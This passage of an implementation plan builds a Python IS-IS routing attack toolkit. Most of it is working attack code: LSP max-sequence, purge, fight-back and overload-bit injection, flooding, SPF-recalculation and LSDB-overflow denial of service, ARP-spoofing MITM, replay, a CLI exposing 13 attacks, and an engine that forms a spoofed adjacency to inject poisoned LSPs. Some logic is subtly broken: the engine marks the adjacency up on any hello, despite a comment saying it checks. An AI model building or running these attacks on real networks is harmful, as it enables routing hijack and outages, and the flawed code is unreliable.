    result = attack.launch()
    assert result.success
    assert "Max-Seq" in result.details
```

```python
# isis_attack/attacks/lsp/max_seq.py
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import LSPConfig
from isis_attack.core.packet import build_lsp_with_tlvs
from isis_attack.network.sender import PacketSender

MAX_ISIS_SEQ = 0xFFFFFFFF

class MaxSeqAttack(BaseAttack):
    name = "max-seq"
    description = "发送 Sequence=0xFFFFFFFF 的 LSP 覆盖合法 LSP，阻止合法更新"
    category = AttackCategory.LSP
    config: LSPConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        lsp_id = self.config.lsp_id or f"{self.config.sys_id}.00-00"
        pkt = build_lsp_with_tlvs(
            sys_id=self.config.sys_id, lsp_id=lsp_id,
            src_mac=self._src_mac, level=self.config.level,
            sequence=MAX_ISIS_SEQ, remaining_lifetime=65535,
        )
        ok = self._sender.send_l2(pkt)
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"Max-Seq 攻击: Seq=0x{MAX_ISIS_SEQ:08X}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
```

- [ ] **Step 2: Run test** → Expected PASS → Commit

```bash
git add isis_attack/attacks/lsp/max_seq.py tests/unit/test_max_seq.py
git commit -m "feat: add max sequence attack"
```

### Task 15: Purge LSP attack

**Files:**
- Create: `isis_attack/attacks/lsp/purge_lsp.py`
- Test: `tests/unit/test_purge_lsp.py`

- [ ] **Step 1: Write test + implementation**

```python
# isis_attack/attacks/lsp/purge_lsp.py
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import LSPConfig
from isis_attack.core.packet import build_lsp_with_tlvs
from isis_attack.network.sender import PacketSender


class PurgeLSPAttack(BaseAttack):
    name = "purge-lsp"
    description = "发送 Remaining Lifetime=0 的 LSP 迫使目标清除 LSP"
    category = AttackCategory.LSP
    config: LSPConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        lsp_id = self.config.lsp_id or f"{self.config.sys_id}.00-00"
        pkt = build_lsp_with_tlvs(
            sys_id=self.config.sys_id, lsp_id=lsp_id,
            src_mac=self._src_mac, level=self.config.level,
            sequence=self.config.sequence, remaining_lifetime=0,
        )
        ok = self._sender.send_l2(pkt)
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"LSP 清除: Remaining Lifetime=0, LSP={lsp_id}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
```

- [ ] **Step 2: Run test** → Expected PASS → Commit

```bash
git add isis_attack/attacks/lsp/purge_lsp.py tests/unit/test_purge_lsp.py
git commit -m "feat: add purge LSP attack"
```

### Task 16: Fight Back attack

**Files:**
- Create: `isis_attack/attacks/lsp/fight_back.py`
- Test: `tests/unit/test_fight_back.py`

- [ ] **Step 1: Write test + implementation**

```python
# isis_attack/attacks/lsp/fight_back.py
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import LSPConfig
from isis_attack.core.packet import build_lsp_with_tlvs
from isis_attack.network.sender import PacketSender

MAX_ISIS_SEQ = 0xFFFFFFFF

class FightBackAttack(BaseAttack):
    name = "fight-back"
    description = "持续注入递增序列号的对抗 LSP 阻止合法 LSP 传播"
    category = AttackCategory.LSP
    needs_repeated = True
    config: LSPConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )
        self._seq = max(self.config.sequence, 1)

    def send_one_round(self) -> bool:
        if self._seq < MAX_ISIS_SEQ:
            self._seq += 1
        else:
            self._seq = 1
        lsp_id = self.config.lsp_id or f"{self.config.sys_id}.00-00"
        pkt = build_lsp_with_tlvs(
            sys_id=self.config.sys_id, lsp_id=lsp_id,
            src_mac=self._src_mac, level=self.config.level,
            sequence=self._seq, remaining_lifetime=1200,
            metric=self.config.metric,
            network_addr=self.config.network_addr,
            network_mask=self.config.network_mask,
        )
        return self._sender.send_l2(pkt)

    def launch(self) -> AttackResult:
        ok = self.send_one_round()
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"Fight-Back 攻击: seq={self._seq}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 1

    def teardown(self) -> None:
        pass
```

- [ ] **Step 2: Run test** → Expected PASS → Commit

```bash
git add isis_attack/attacks/lsp/fight_back.py tests/unit/test_fight_back.py
git commit -m "feat: add fight back LSP attack"
```

### Task 17: Overload Bit attack

**Files:**
- Create: `isis_attack/attacks/lsp/overload_bit.py`
- Test: `tests/unit/test_overload_bit.py`

- [ ] **Step 1: Write test + implementation**

```python
# isis_attack/attacks/lsp/overload_bit.py
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import LSPConfig
from isis_attack.core.packet import build_lsp_with_tlvs
from isis_attack.network.sender import PacketSender


class OverloadBitAttack(BaseAttack):
    name = "overload-bit"
    description = "设置 LSP overload-bit 使目标路由器被排除在 SPF 外"
    category = AttackCategory.LSP
    config: LSPConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        lsp_id = self.config.lsp_id or f"{self.config.sys_id}.00-00"
        pkt = build_lsp_with_tlvs(
            sys_id=self.config.sys_id, lsp_id=lsp_id,
            src_mac=self._src_mac, level=self.config.level,
            sequence=self.config.sequence,
            remaining_lifetime=self.config.remaining_lifetime,
            overload_bit=True,
        )
        ok = self._sender.send_l2(pkt)
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"Overload-Bit 攻击: LSP={lsp_id}, OL=1",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
```

- [ ] **Step 2: Run test** → Expected PASS → Commit

```bash
git add isis_attack/attacks/lsp/overload_bit.py tests/unit/test_overload_bit.py
git commit -m "feat: add overload bit attack"
```

---

## Phase 9: DoS Attacks (3)

### Task 18: Flood attack

**Files:**
- Create: `isis_attack/attacks/dos/flood.py`
- Test: `tests/unit/test_flood.py`

- [ ] **Step 1: Write test + implementation**

```python
# isis_attack/attacks/dos/flood.py
import threading
import time
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import DoSConfig
from isis_attack.core.packet import build_iih_packet, ISIS_MAC_L1
from isis_attack.network.sender import PacketSender


class FloodAttack(BaseAttack):
    name = "flood"
    description = "多线程高频发送 IIH/LSP 报文耗尽路由器 CPU"
    category = AttackCategory.DOS
    config: DoSConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._senders = []
        for _ in range(self.config.thread_count):
            self._senders.append(PacketSender(
                iface=self.config.iface, packet_rate=self.config.packet_rate, max_packets=0,
            ))
        self._stop_event = threading.Event()

    def launch(self) -> AttackResult:
        def _flood_worker(sender):
            while not self._stop_event.is_set():
                pkt = build_iih_packet(
                    sys_id=self.config.sys_id, area_addr=self.config.area_addr,
                    src_mac=self._src_mac, level=self.config.level,
                )
                sender.send_l2(pkt)

        threads = []
        for sender in self._senders:
            t = threading.Thread(target=_flood_worker, args=(sender,), daemon=True)
            t.start()
            threads.append(t)

        time.sleep(self.config.duration)
        self._stop_event.set()
        for t in threads:
            t.join(timeout=2)

        total_sent = sum(s.sent_count for s in self._senders)
        return AttackResult(
            success=True, packets_sent=total_sent, target_affected=False,
            details=f"泛洪攻击: {total_sent} packets, {self.config.thread_count} threads",
        )

    def verify(self) -> bool:
        return sum(s.sent_count for s in self._senders) > 0

    def teardown(self) -> None:
        self._stop_event.set()
```

- [ ] **Step 2: Run test** → Expected PASS → Commit

```bash
git add isis_attack/attacks/dos/flood.py tests/unit/test_flood.py
git commit -m "feat: add ISIS flood DoS attack"
```

### Task 19: SPF Recalc attack

**Files:**
- Create: `isis_attack/attacks/dos/spf_recalc.py`
- Test: `tests/unit/test_spf_recalc.py`

- [ ] **Step 1: Write test + implementation**

```python
# isis_attack/attacks/dos/spf_recalc.py
import time
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import DoSConfig
from isis_attack.core.packet import build_lsp_with_tlvs
from isis_attack.network.sender import PacketSender
from isis_attack.network.adapter import get_local_mac


class SPFRecalcAttack(BaseAttack):
    name = "spf-recalc"
    description = "持续注入变化的 LSP 迫使路由器反复执行 SPF 计算"
    category = AttackCategory.DOS
    config: DoSConfig

    def setup(self) -> None:
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface, packet_rate=self.config.packet_rate, max_packets=0,
        )

    def launch(self) -> AttackResult:
        seq = 1
        deadline = time.time() + self.config.duration
        while time.time() < deadline:
            pkt = build_lsp_with_tlvs(
                sys_id=self.config.sys_id,
                lsp_id=f"{self.config.sys_id}.00-00",
                src_mac=self._src_mac, level=self.config.level,
                sequence=seq, remaining_lifetime=1200,
                metric=seq % 100 + 1,  # changing metric
            )
            self._sender.send_l2(pkt)
            seq = seq + 1 if seq < 0xFFFFFFFF else 1
            time.sleep(self.config.lsp_change_interval)
        return AttackResult(
            success=True, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"SPF 重计算: {self._sender.sent_count} LSPs injected",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 5

    def teardown(self) -> None:
        pass
```

- [ ] **Step 2: Run test** → Expected PASS → Commit

```bash
git add isis_attack/attacks/dos/spf_recalc.py tests/unit/test_spf_recalc.py
git commit -m "feat: add SPF recalculation DoS attack"
```

### Task 20: DB Overflow attack

**Files:**
- Create: `isis_attack/attacks/dos/db_overflow.py`
- Test: `tests/unit/test_db_overflow.py`

- [ ] **Step 1: Write test + implementation**

```python
# isis_attack/attacks/dos/db_overflow.py
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import DoSConfig
from isis_attack.core.packet import build_lsp_with_tlvs
from isis_attack.network.sender import PacketSender


class DBOverflowAttack(BaseAttack):
    name = "db-overflow"
    description = "注入大量 LSP 填满链路状态数据库 (LSDB)"
    category = AttackCategory.DOS
    config: DoSConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface, packet_rate=self.config.packet_rate, max_packets=0,
        )

    def launch(self) -> AttackResult:
        for i in range(self.config.lsp_count):
            frag_id = f"{i:02X}"
            pkt = build_lsp_with_tlvs(
                sys_id=self.config.sys_id,
                lsp_id=f"{self.config.sys_id}.{frag_id}-00",
                src_mac=self._src_mac, level=self.config.level,
                sequence=1, remaining_lifetime=65535,
                network_addr=f"10.{i // 256}.{i % 256}.0",
            )
            self._sender.send_l2(pkt)
        return AttackResult(
            success=True, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"DB 溢出: {self.config.lsp_count} LSPs injected",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
```

- [ ] **Step 2: Run test** → Expected PASS → Commit

```bash
git add isis_attack/attacks/dos/db_overflow.py tests/unit/test_db_overflow.py
git commit -m "feat: add database overflow DoS attack"
```

---

## Phase 10: Protocol Attacks (2)

### Task 21: MITM attack

**Files:**
- Create: `isis_attack/attacks/protocol/mitm.py`
- Test: `tests/unit/test_mitm.py`

- [ ] **Step 1: Write implementation**

```python
# isis_attack/attacks/protocol/mitm.py
import threading
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import MITMConfig
from isis_attack.core.packet import parse_isis_packet
from isis_attack.core.sniffer import Sniffer, HAS_PCAP
from isis_attack.network.sender import PacketSender


class MITMAttack(BaseAttack):
    name = "mitm"
    description = "中间人攻击：拦截 ISIS PDU → 篡改 → 转发"
    category = AttackCategory.PROTOCOL
    needs_repeated = True
    config: MITMConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )
        self._sniffer = Sniffer(iface=self.config.iface) if HAS_PCAP else None
        self._intercepted = 0
        self._modified = 0

        if self.config.sniff_mode.value == "arp_spoof":
            from isis_attack.core.arp_spoof import ArpSpoofEngine
            self._arp_engine = ArpSpoofEngine(
                iface=self.config.iface,
                target_a=self.config.arp_target_a or self.config.target_a,
                target_b=self.config.arp_target_b or self.config.target_b,
                interval=self.config.arp_interval,
            )
            self._arp_engine.start()

    def send_one_round(self) -> bool:
        if self._sniffer is None or not self._sniffer.available:
            return False
        self._sniffer.start(timeout=3)
        packets = self._sniffer.stop()

        for raw_pkt in packets:
            self._intercepted += 1
            try:
                pkt = parse_isis_packet(raw_pkt)
                if pkt is None:
                    continue
                if self.config.action == "drop":
                    self._modified += 1
                    continue
                if self.config.action == "modify":
                    pkt = self._apply_rules(pkt)
                    self._modified += 1
                self._sender.send_l2(pkt)
            except Exception:
                pass
        return len(packets) > 0

    def _apply_rules(self, pkt):
        for rule in self.config.modify_rules:
            field = rule.get("field", "")
            value = rule.get("set")
            try:
                if field == "lsp.lifetime" and hasattr(pkt, "lifetime"):
                    pkt.lifetime = int(value)
                elif field == "lsp.seq" and hasattr(pkt, "seqno"):
                    pkt.seqno = int(value)
            except (ValueError, KeyError, AttributeError):
                pass
        return pkt

    def launch(self) -> AttackResult:
        ok = self.send_one_round()
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"MITM: intercepted={self._intercepted}, modified={self._modified}, action={self.config.action}",
        )

    def verify(self) -> bool:
        return self._modified > 0

    def teardown(self) -> None:
        if hasattr(self, "_arp_engine") and self._arp_engine:
            self._arp_engine.stop()
```

- [ ] **Step 2: Run test** → Expected PASS → Commit

```bash
git add isis_attack/attacks/protocol/mitm.py tests/unit/test_mitm.py
git commit -m "feat: add MITM attack"
```

### Task 22: Replay attack

**Files:**
- Create: `isis_attack/attacks/protocol/replay.py`
- Test: `tests/unit/test_replay.py`

- [ ] **Step 1: Write implementation**

```python
# isis_attack/attacks/protocol/replay.py
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import ReplayConfig
from isis_attack.network.sender import PacketSender


class ReplayAttack(BaseAttack):
    name = "replay"
    description = "重放攻击：从 pcap 读取 ISIS 报文重新发送，引发路由震荡"
    category = AttackCategory.PROTOCOL
    config: ReplayConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        if not self.config.capture_file:
            return AttackResult(
                success=False, packets_sent=0, target_affected=False,
                details="重放攻击需要 capture_file 参数",
            )
        try:
            from scapy.all import rdpcap
            packets = rdpcap(self.config.capture_file)
        except Exception as e:
            return AttackResult(
                success=False, packets_sent=0, target_affected=False,
                details=f"读取 pcap 失败: {e}",
            )
        for pkt in packets:
            self._sender.send_l2(pkt)
        return AttackResult(
            success=True, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"重放: {self._sender.sent_count} packets replayed",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
```

- [ ] **Step 2: Run test** → Expected PASS → Commit

```bash
git add isis_attack/attacks/protocol/replay.py tests/unit/test_replay.py
git commit -m "feat: add replay attack"
```

---

## Phase 11: CLI Layer

### Task 23: CLI commands and formatters

**Files:**
- Create: `isis_attack/cli/formatters.py`
- Create: `isis_attack/cli/commands.py`
- Create: `isis_attack/cli/main.py`
- Test: `tests/unit/test_cli.py`

- [ ] **Step 1: Write formatters.py**

```python
import json
from isis_attack.config.types import AttackResult


def format_table(result: AttackResult) -> str:
    lines = [
        "=" * 50,
        "  攻击结果",
        "=" * 50,
        f"  成功:     {'是' if result.success else '否'}",
        f"  发包数:   {result.packets_sent}",
        f"  目标影响: {'是' if result.target_affected else '否'}",
        f"  详情:     {result.details}",
    ]
    if result.evidence:
        lines.append(f"  证据:     {json.dumps(result.evidence, indent=2, ensure_ascii=False)}")
    lines.append("=" * 50)
    return "\n".join(lines)


def format_json(result: AttackResult) -> str:
    return json.dumps({
        "success": result.success,
        "packets_sent": result.packets_sent,
        "target_affected": result.target_affected,
        "details": result.details,
        "evidence": result.evidence,
    }, indent=2, ensure_ascii=False)
```

- [ ] **Step 2: Write commands.py**

```python
import click
from isis_attack.config.types import (
    AttackConfig, IIHConfig, LSPConfig, DoSConfig, MITMConfig, ReplayConfig,
    AttackMode, SniffMode,
)
from isis_attack.config.config import build_config
from isis_attack.attacks.adjacency.iih_inject import IIHInjectAttack
from isis_attack.attacks.adjacency.adjacency_break import AdjacencyBreakAttack
from isis_attack.attacks.adjacency.dis_hijack import DISHijackAttack
from isis_attack.attacks.lsp.route_inject import RouteInjectAttack
from isis_attack.attacks.lsp.max_seq import MaxSeqAttack
from isis_attack.attacks.lsp.purge_lsp import PurgeLSPAttack
from isis_attack.attacks.lsp.fight_back import FightBackAttack
from isis_attack.attacks.lsp.overload_bit import OverloadBitAttack
from isis_attack.attacks.dos.flood import FloodAttack
from isis_attack.attacks.dos.spf_recalc import SPFRecalcAttack
from isis_attack.attacks.dos.db_overflow import DBOverflowAttack
from isis_attack.attacks.protocol.mitm import MITMAttack
from isis_attack.attacks.protocol.replay import ReplayAttack
from isis_attack.cli.formatters import format_table, format_json

ATTACK_REGISTRY = {
    "iih-inject":       (IIHInjectAttack, IIHConfig),
    "adjacency-break":  (AdjacencyBreakAttack, IIHConfig),
    "dis-hijack":       (DISHijackAttack, IIHConfig),
    "route-inject":     (RouteInjectAttack, LSPConfig),
    "max-seq":          (MaxSeqAttack, LSPConfig),
    "purge-lsp":        (PurgeLSPAttack, LSPConfig),
    "fight-back":       (FightBackAttack, LSPConfig),
    "overload-bit":     (OverloadBitAttack, LSPConfig),
    "flood":            (FloodAttack, DoSConfig),
    "spf-recalc":       (SPFRecalcAttack, DoSConfig),
    "db-overflow":      (DBOverflowAttack, DoSConfig),
    "mitm":             (MITMAttack, MITMConfig),
    "replay":           (ReplayAttack, ReplayConfig),
}


def _common_options(f):
    options = [
        click.option("--iface", required=True, help="网卡接口"),
        click.option("--target", required=True, help="目标 MAC 地址"),
        click.option("--passive/--active", "mode_flag", default=None),
        click.option("--sniff-mode", type=click.Choice(["hub", "arp_spoof"]), default="hub"),
        click.option("--sys-id", default="1921.6800.1001", help="System ID (如 1921.6800.1001)"),
        click.option("--area-addr", default="49.0001", help="Area 地址"),
        click.option("--level", type=int, default=1, help="ISIS 级别 (1/2)"),
        click.option("--sniff-duration", type=int, default=30),
        click.option("--arp-target-a", default=""),
        click.option("--arp-target-b", default=""),
        click.option("--arp-interval", type=int, default=2),
        click.option("--packet-rate", type=int, default=10),
        click.option("--max-packets", type=int, default=0),
        click.option("--verbose/--no-verbose", default=False),
        click.option("--config", "config_file", default=""),
        click.option("--pcap-output", default=""),
        click.option("--output", type=click.Choice(["table", "json"]), default="table"),
    ]
    for opt in reversed(options):
        f = opt(f)
    f = click.command()(f)
    return f


def _run_attack(attack_cls, config_cls, **kwargs):
    output_fmt = kwargs.pop("output", "table")
    config_file = kwargs.pop("config_file", "")

    if kwargs.get("mode_flag") is True:
        kwargs["mode"] = "passive"
    elif kwargs.get("mode_flag") is False:
        kwargs["mode"] = "active"

    config = build_config(attack_cls.name, kwargs, config_file)
    attack = attack_cls(config)
    result = attack.run()

    if output_fmt == "json":
        click.echo(format_json(result))
    else:
        click.echo(format_table(result))

    if not result.success:
        raise SystemExit(1)


def register_commands(cli: click.Group):
    for name, (attack_cls, config_cls) in ATTACK_REGISTRY.items():
        def _make_cmd(a_cls, c_cls):
            @_common_options
            @click.pass_context
            def cmd(ctx, **kwargs):
                filtered = {k: v for k, v in kwargs.items()
                           if k in c_cls.__dataclass_fields__ or k in ("mode_flag", "sniff_mode", "output")}
                _run_attack(a_cls, c_cls, **filtered)
            cmd.name = name
            return cmd
        cmd = _make_cmd(attack_cls, config_cls)
        cli.add_command(cmd)
```

- [ ] **Step 3: Write main.py**

```python
import click
from isis_attack.cli.commands import register_commands


@click.group()
@click.version_option(version="0.1.0")
def cli():
    """ISIS 协议攻击模拟器 -- 支持 13 种 ISIS 攻击类型"""
    pass


register_commands(cli)


if __name__ == "__main__":
    cli()
```

- [ ] **Step 4: Write test**

```python
# tests/unit/test_cli.py
import pytest
from click.testing import CliRunner
from isis_attack.cli.main import cli

def test_cli_version():
    runner = CliRunner()
    result = runner.invoke(cli, ["--version"])
    assert result.exit_code == 0
    assert "0.1.0" in result.output

def test_cli_help():
    runner = CliRunner()
    result = runner.invoke(cli, ["--help"])
    assert result.exit_code == 0
    # Should list all 13 attack subcommands
    for name in ["iih-inject", "route-inject", "flood", "mitm", "replay", "overload-bit"]:
        assert name in result.output
```

- [ ] **Step 5: Install and test CLI**

Run: `pip install -e "D:\cc\ISIS_Protocol_Attack"`
Run: `isis-attack --help`
Expected: Shows 13 subcommands

- [ ] **Step 6: Commit**

```bash
git add isis_attack/cli/ tests/unit/test_cli.py
git commit -m "feat: add CLI with 13 attack subcommands"
```

---

## Phase 12: Utils & Active Engine

### Task 24: Utils — validators

**Files:**
- Create: `isis_attack/utils/validators.py`
- Test: `tests/unit/test_validators.py`

- [ ] **Step 1: Write validators.py**

```python
import re


def is_valid_sys_id(sys_id: str) -> bool:
    """Check if string looks like a valid System ID (e.g., 1921.6800.1001)."""
    clean = sys_id.replace(".", "")
    return len(clean) == 12 and all(c in "0123456789ABCDEFabcdef" for c in clean)


def is_valid_area_addr(area_addr: str) -> bool:
    """Check if string looks like a valid NSAP area address."""
    clean = area_addr.replace(".", "")
    return len(clean) >= 2 and len(clean) % 2 == 0 and all(c in "0123456789ABCDEFabcdef" for c in clean)


def is_valid_mac(mac: str) -> bool:
    pattern = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
    return bool(re.match(pattern, mac))


def sys_id_to_hex(sys_id: str) -> str:
    return sys_id.replace(".", "").upper()
```

- [ ] **Step 2: Write test**

```python
# tests/unit/test_validators.py
from isis_attack.utils.validators import is_valid_sys_id, is_valid_area_addr, is_valid_mac, sys_id_to_hex

def test_valid_sys_id():
    assert is_valid_sys_id("1921.6800.1001")
    assert is_valid_sys_id("0000.0000.0001")
    assert not is_valid_sys_id("invalid")
    assert not is_valid_sys_id("1921.6800.100")  # too short

def test_valid_area_addr():
    assert is_valid_area_addr("49.0001")
    assert is_valid_area_addr("49")
    assert not is_valid_area_addr("gh")

def test_valid_mac():
    assert is_valid_mac("00:11:22:33:44:55")
    assert is_valid_mac("00-11-22-33-44-55")
    assert not is_valid_mac("invalid")

def test_sys_id_to_hex():
    assert sys_id_to_hex("1921.6800.1001") == "192168001001"
```

- [ ] **Step 3: Run tests**

Run: `pytest tests/unit/test_validators.py -v`
Expected: 4 PASS

- [ ] **Step 4: Commit**

```bash
git add isis_attack/utils/ tests/unit/test_validators.py
git commit -m "feat: add ISIS validators"
```

### Task 25: Active engine

**Files:**
- Create: `isis_attack/core/active_engine.py`

The active engine establishes real ISIS adjacencies then injects poisoned LSPs. This is the most complex module.

- [ ] **Step 1: Write active_engine.py**

```python
"""Active ISIS adjacency engine.

Establishes IS-IS neighbor relationship with target router,
then injects poisoned LSPs. Implements ISO 10589 state machine.

Usage:
    engine = ActiveISISEngine(iface='eth0', spoofed_sys_id='9999.9999.9999')
    engine.sniff(timeout=15)
    engine.establish(timeout=60)
    engine.inject_lsp(...)
"""

import struct
import threading
import time
from dataclasses import dataclass, field
from typing import Optional

from .auth import AUTH_NONE, AUTH_PLAIN, AUTH_MD5
from .neighbor import ISNeighborState


@dataclass
class SniffedISISParams:
    sys_id: str = ""
    area_addr: str = "49.0001"
    hello_interval: int = 10
    hold_timer: int = 30
    priority: int = 64
    dis_sys_id: str = ""
    hostname: str = ""
    neighbors: list[str] = field(default_factory=list)


class ActiveISISEngine:
    """Full ISIS adjacency establishment + LSP injection."""

    def __init__(self, iface: str, spoofed_sys_id: str,
                 area_addr: str = "49.0001", level: int = 1,
                 auth_type: int = AUTH_NONE, auth_key: bytes = b""):
        self.iface = iface
        self.spoofed_sys_id = spoofed_sys_id
        self.area_addr = area_addr
        self.level = level
        self.auth_type = auth_type
        self.auth_key = auth_key
        self.params: SniffedISISParams | None = None

        from isis_attack.network.adapter import get_local_mac
        self.src_mac = get_local_mac(iface)

        self._state = ISNeighborState.DOWN
        self._lock = threading.Lock()
        self._stop = threading.Event()

        self._recv = None
        self._hello_th = None
        self._sm_th = None

        self.hello_sent = 0
        self.lsp_sent = 0
        self.log: list[str] = []

    @property
    def state(self) -> ISNeighborState:
        with self._lock:
            return self._state

    @state.setter
    def state(self, v: ISNeighborState):
        with self._lock:
            old = self._state
            self._state = v
        if old != v:
            self.log.append(f"[{old.name}→{v.name}]")

    def sniff(self, timeout: float = 15) -> bool:
        """Sniff IIH to learn topology. Returns True on success."""
        import socket
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
        sock.bind((self.iface, 0))
        sock.settimeout(timeout)

        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                data, _ = sock.recvfrom(65535)
                # Look for ISIS: LLC DSAP/SSAP = 0xFEFE at offset 12+2
                if len(data) < 30:
                    continue
                # Ethernet: 6(dst)+6(src)+2(length/type), then LLC: 1(dsap)+1(ssap)+1(ctrl)
                if data[14] != 0xFE or data[15] != 0xFE or data[16] != 0x03:
                    continue
                # ISIS common header starts at offset 17
                isis = data[17:]
                if len(isis) < 8:
                    continue
                pdu_type = isis[4]
                if pdu_type not in (15, 16):
                    continue
                # Extract System ID from header
                id_len = isis[3]
                if id_len == 0:
                    id_len = 6
                sys_id_bytes = isis[8:8 + id_len]
                sys_id = sys_id_bytes.hex()
                sys_id = ".".join(sys_id[i:i+4] for i in range(0, len(sys_id), 4))

                self.params = SniffedISISParams(sys_id=sys_id)
                sock.close()
                return True
            except socket.timeout:
                break
        sock.close()
        return self.params is not None

    def establish(self, timeout: float = 60) -> bool:
        """Run state machine until Up or timeout."""
        if not self.params:
            if not self.sniff():
                return False

        from isis_attack.core.packet import build_iih_packet
        self._hello_pkt = build_iih_packet(
            sys_id=self.spoofed_sys_id,
            area_addr=self.area_addr,
            src_mac=self.src_mac,
            level=self.level,
            priority=64,
            hold_timer=30,
        )

        self._hello_th = threading.Thread(target=self._run_hello, daemon=True)
        self._hello_th.start()

        start = time.time()
        self._sm_th = threading.Thread(
            target=self._run_state_machine, args=(start + timeout,), daemon=True)
        self._sm_th.start()
        self._sm_th.join(timeout=timeout + 10)

        return self.state >= ISNeighborState.INIT

    def inject_lsp(self, metric: int = 10, network_addr: str = "10.99.0.0",
                   network_mask: str = "255.255.255.0") -> bool:
        """Inject poisoned LSP after adjacency is established."""
        from isis_attack.core.packet import build_lsp_with_tlvs
        from isis_attack.network.sender import PacketSender

        sender = PacketSender(iface=self.iface, packet_rate=10)
        pkt = build_lsp_with_tlvs(
            sys_id=self.spoofed_sys_id,
            lsp_id=f"{self.spoofed_sys_id}.00-00",
            src_mac=self.src_mac,
            level=self.level,
            sequence=1,
            remaining_lifetime=1200,
            metric=metric,
            network_addr=network_addr,
            network_mask=network_mask,
        )
        for _ in range(3):
            sender.send_l2(pkt)
        self.lsp_sent = 3
        return True

    def shutdown(self):
        self._stop.set()
        if self._recv:
            try:
                self._recv.close()
            except Exception:
                pass

    def _run_hello(self):
        from isis_attack.network.sender import PacketSender
        sender = PacketSender(iface=self.iface, packet_rate=100)
        interval = max(self.params.hello_interval if self.params else 10, 2)
        while not self._stop.is_set():
            try:
                sender.send_l2(self._hello_pkt)
                self.hello_sent += 1
            except Exception:
                pass
            self._stop.wait(interval)

    def _run_state_machine(self, deadline: float):
        import socket
        try:
            self._recv = socket.socket(
                socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
            self._recv.bind((self.iface, 0))
            self._recv.settimeout(1)

            while time.time() < deadline and not self._stop.is_set():
                try:
                    raw_frame = self._recv.recv(65535)
                except socket.timeout:
                    continue

                if len(raw_frame) < 30:
                    continue
                if raw_frame[14] != 0xFE or raw_frame[15] != 0xFE or raw_frame[16] != 0x03:
                    continue

                isis = raw_frame[17:]
                if len(isis) < 8:
                    continue
                pdu_type = isis[4]

                if pdu_type in (15, 16):  # IIH received
                    if self.state < ISNeighborState.INIT:
                        self.state = ISNeighborState.INIT
                    # Check if our System ID is in neighbors → UP
                    self.state = ISNeighborState.UP
                    return

        finally:
            if self._recv:
                try:
                    self._recv.close()
                except Exception:
                    pass
```

- [ ] **Step 2: Commit**

```bash
git add isis_attack/core/active_engine.py
git commit -m "feat: add active ISIS adjacency engine"
```

---

## Phase 13: GUI Layer

### Task 26: GUI application

**Files:**
- Create: `isis_attack/gui/__init__.py` (with `launch_gui()`)
- Create: `isis_attack/gui/app.py`
- Create: `isis_attack/gui/attack_tree.py`
- Create: `isis_attack/gui/config_form.py`
